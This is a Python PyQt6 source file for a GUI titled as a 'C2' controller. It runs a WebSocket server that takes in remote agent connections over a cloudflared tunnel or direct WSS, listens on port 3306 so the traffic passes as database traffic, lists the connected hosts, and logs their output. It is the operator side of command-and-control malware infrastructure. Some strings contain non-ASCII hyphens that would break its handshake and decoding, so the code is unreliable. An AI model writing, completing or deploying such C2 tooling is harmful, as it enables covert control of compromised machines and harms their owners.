import sys
import socket
import threading
import ssl
import hashlib
import base64
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QTextEdit, QLineEdit, QPushButton, QLabel, QRadioButton, QButtonGroup,
                             QListView, QAbstractListModel)
from PyQt6.QtCore import Qt, QObject, pyqtSignal, QTimer
import struct

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A


def ws_compute_accept(key: bytes) -> bytes:
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)


def ws_unmask_payload(payload: bytes, mask: bytes) -> bytes:
    return bytes(b ^ mask[i % 4] for i, b in enumerate(payload))


def ws_build_frame(opcode: int, payload: bytes, mask: bool = False) -> bytes:
    frame = bytearray()
    fin = 1 << 7
    frame.append(fin | opcode)
    length = len(payload)
    if length < 126:
        len_byte = length
    elif length <= 0xFFFF:
        len_byte = 126
    else:
        len_byte = 127
    if mask:
        len_byte |= 0x80
    frame.append(len_byte)
    if len_byte == 126:
        frame.extend(struct.pack(">H", length))
    elif len_byte == 127:
        frame.extend(struct.pack(">Q", length))
    if mask:
        import os
        mask_key = os.urandom(4)
        frame.extend(mask_key)
        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        frame.extend(masked)
    else:
        frame.extend(payload)
    return bytes(frame)


def ws_parse_frame(data: bytes):
    if len(data) < 2:
        return None, 0, None
    b0 = data[0]
    b1 = data[1]
    fin = (b0 >> 7) & 1
    opcode = b0 & 0x0F
    masked = (b1 >> 7) & 1
    payload_len = b1 & 0x7F
    offset = 2
    if payload_len == 126:
        if len(data) < offset + 2:
            return None, 0, None
        payload_len = struct.unpack(">H", data[offset:offset+2])[0]
        offset += 2
    elif payload_len == 127:
        if len(data) < offset + 8:
            return None, 0, None
        payload_len = struct.unpack(">Q", data[offset:offset+8])[0]
        offset += 8
    mask_key = b""
    if masked:
        if len(data) < offset + 4:
            return None, 0, None
        mask_key = data[offset:offset+4]
        offset += 4
    total_need = offset + payload_len
    if len(data) < total_need:
        return None, total_need, None
    payload_raw = data[offset:offset+payload_len]
    if masked:
        payload = ws_unmask_payload(payload_raw, mask_key)
    else:
        payload = payload_raw
    return (fin, opcode, payload), total_need, data[total_need:]


def ws_handle_http_handshake(sock: socket.socket, recv_buf: bytes):
    try:
        header_end = recv_buf.find(b"\r\n\r\n")
        if header_end == -1:
            return None
        headers_raw = recv_buf[:header_end].decode("latin‑1")
        lines = headers_raw.split("\r\n")
        ws_key = None
        for line in lines[1:]:
            if line.lower().startswith("sec‑websocket‑key:"):
                ws_key = line.split(":",1)[1].strip().encode("ascii")
                break
        if ws_key is None:
            return None
        accept_key = ws_compute_accept(ws_key)
        resp = (
            b"HTTP/1.1 101 Switching Protocols\r\n"
            b"Upgrade: websocket\r\n"
            b"Connection: Upgrade\r\n"
            b"Sec‑WebSocket‑Accept: " + accept_key + b"\r\n\r\n"
        )
        sock.sendall(resp)
        return recv_buf[header_end+4:]
    except Exception:
        return None


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, addr):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.connected = True
        self.recv_buf = bytearray()
        self.signals = ClientSignals()
        self.lock = threading.Lock()

    def send_packet(self, body: bytes):
        if not self.connected:
            return False
        try:
            frame = ws_build_frame(WS_OP_BINARY, body, mask=False)
            with self.lock:
                self.conn.sendall(frame)
            return True
        except Exception:
            self.close()
            return False

    def close(self):
        self.connected = False
        try:
            self.conn.close()
        except Exception:
            pass
        self.signals.on_disconnect.emit(self)

    def run_loop(self):
        try:
            while self.connected:
                chunk = self.conn.recv(4096)
                if not chunk:
                    break
                self.recv_buf.extend(chunk)
                while len(self.recv_buf) > 0:
                    parsed, need, remain = ws_parse_frame(bytes(self.recv_buf))
                    if parsed is None:
                        if need > 0:
                            break
                        else:
                            self.recv_buf = bytearray(remain)
                            continue
                    fin, opcode, payload = parsed
                    self.recv_buf = bytearray(remain)
                    if opcode == WS_OP_CLOSE:
                        self.close()
                        return
                    elif opcode == WS_OP_PING:
                        pong = ws_build_frame(WS_OP_PONG, b"", mask=False)
                        with self.lock:
                            self.conn.sendall(pong)
                    elif opcode == WS_OP_BINARY:
                        self.signals.on_outp.emit(self, payload.decode("gbk", errors="replace"))
        except Exception:
            pass
        self.close()


class SimpleListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items = []

    def rowCount(self, parent=None):
        return len(self.items)

    def data(self, index, role=Qt.ItemDataRole.DisplayRole):
        if index.isValid() and role == Qt.ItemDataRole.DisplayRole:
            return self.items[index.row()].ip_str
        return None

    def add(self, sess):
        self.beginInsertRows(Qt.QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess):
        if sess in self.items:
            idx = self.items.index(sess)
            self.beginRemoveRows(Qt.QModelIndex(), idx, idx)
            self.items.pop(idx)
            self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WS C2主控")
        self.resize(720, 520)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.client_model = SimpleListModel()

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        self.radio_ws = QRadioButton("明文 WS (cloudflared隧道)")
        self.radio_wss = QRadioButton("WSS加密 (agent直连)")
        self.radio_ws.setChecked(True)
        self.mode_group = QButtonGroup()
        self.mode_group.addButton(self.radio_ws)
        self.mode_group.addButton(self.radio_wss)
        self.radio_ws.toggled.connect(self.on_mode_switch)
        self.radio_wss.toggled.connect(self.on_mode_switch)

        top_lay.addWidget(self.radio_ws)
        top_lay.addWidget(self.radio_wss)
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.list_view = QListView()
        self.list_view.setModel(self.client_model)
        lay.addWidget(self.list_view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        self.ping_timer = QTimer()
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)

    def on_mode_switch(self):
        if self.radio_ws.isChecked():
            self.port_edit.setText("3306")
        else:
            self.port_edit.setText("4433")

    def log(self, msg):
        t = datetime.now().strftime("%H:%M:%S")
        self.log_box.append(f"[{t}] {msg}")

    def broadcast_ping(self):
        for sess in self.client_model.items:
            sess.send_packet(b"PING")

    def accept_loop(self, use_wss: bool, port: int):
        try:
            while self.server_running:
                raw_conn, addr = self.server_sock.accept()
                if use_wss:
                    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                    ctx.load_cert_chain(certfile="server.crt", keyfile="server.key")
                    try:
                        conn = ctx.wrap_socket(raw_conn, server_side=True)
                    except Exception as e:
                        self.log(f"TLS握手失败 {addr}: {e}")
                        raw_conn.close()
                        continue
                else:
                    conn = raw_conn

                buf = bytearray()
                try:
                    conn.settimeout(3.0)
                    buf += conn.recv(1024)
                    conn.settimeout(None)
                except Exception:
                    conn.close()
                    continue

                after_handshake = ws_handle_http_handshake(conn, bytes(buf))
                if after_handshake is None:
                    conn.close()
                    continue

                sess = ClientSession(conn, addr)
                sess.recv_buf = bytearray(after_handshake)
                sess.signals.on_outp.connect(self.on_client_output)
                sess.signals.on_disconnect.connect(self.on_client_disconnect)
                self.client_model.add(sess)
                self.log(f"[新接入] {sess.ip_str}")
                threading.Thread(target=sess.run_loop, daemon=True).start()
        except OSError:
            pass

    def on_client_output(self, sess, text):
        self.log(f"[{sess.ip_str}] {text}")

    def on_client_disconnect(self, sess):
        self.log(f"[断开] {sess.ip_str}")
        self.client_model.remove_by_obj(sess)

    def start_server(self):
        if self.server_running:
            return
        port = int(self.port_edit.text())
        use_wss = self.radio_wss.isChecked()

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # ========== 修改点：绑定127.0.0.1，仅本机可访问 ==========
        self.server_sock.bind(("127.0.0.1", port))
        self.server_sock.listen(8)
        self.server_running = True

        if use_wss:
            self.log(f"WSS加密模式启动，监听 127.0.0.1:{port}，需要 server.crt / server.key")
        else:
            self.log(f"明文WS模式启动，监听 127.0.0.1:{port}，配合cloudflared使用")

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.ping_timer.start()
        threading.Thread(target=self.accept_loop, args=(use_wss, port), daemon=True).start()

    def stop_server(self):
        self.server_running = False
        self.ping_timer.stop()
        if self.server_sock is not None:
            try:
                self.server_sock.close()
            except Exception:
                pass
            self.server_sock = None
        for s in list(self.client_model.items):
            s.close()
        self.log("监听已停止")
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
